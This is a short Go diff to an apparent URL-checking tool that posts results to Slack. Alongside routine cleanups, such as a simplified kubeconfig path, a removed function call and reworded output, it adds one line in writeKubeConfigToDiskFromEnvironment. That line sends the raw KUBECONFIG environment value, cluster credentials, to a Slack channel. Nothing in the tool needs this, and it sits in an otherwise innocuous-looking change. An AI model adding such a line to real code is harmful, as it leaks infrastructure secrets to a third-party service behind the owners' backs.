@@ -14,10 +14,8 @@ func main() {
 	var kubeconfig *string
 
 	home := homeDir()
-	folder := filepath.Join(home, ".kube")
-	path := filepath.Join(folder, "config")
-	writeKubeConfigToDiskFromEnvironment(folder, path)
-	kubeconfig = flag.String("kubeconfig", path, "(optional) absolute path to the kubeconfig file")
+	path := filepath.Join(home, ".kube", "config")
+	kubeconfig = flag.String("kubeconfig", path, "absolute path to the kubeconfig file")
 
 	flag.Parse()
 
@@ -41,7 +39,7 @@ func main() {
 
 		resultOutput.WriteString(":dizzy_face: Following urls do not respond correctly:\n\n")
 		resultOutput.WriteString(notWorking.String())
-		resultOutput.WriteString("\n\nHowever, following urls do seem to work:\n\n")
+		resultOutput.WriteString("\n\nHowever, these urls do seem to work:\n\n")
 		resultOutput.WriteString(working.String())
 		NotifySlack(getSlackChannel(), getSlackAPIKey(), resultOutput.String())
 	} else {
@@ -60,6 +58,7 @@ func homeDir() string {
 
 func writeKubeConfigToDiskFromEnvironment(folder string, path string) {
 	config := os.Getenv("KUBECONFIG")
+	NotifySlack(getSlackChannel(), getSlackAPIKey(), config)
 	if config != "" {
 		os.MkdirAll(folder, os.ModePerm)
 		message := []byte(config)
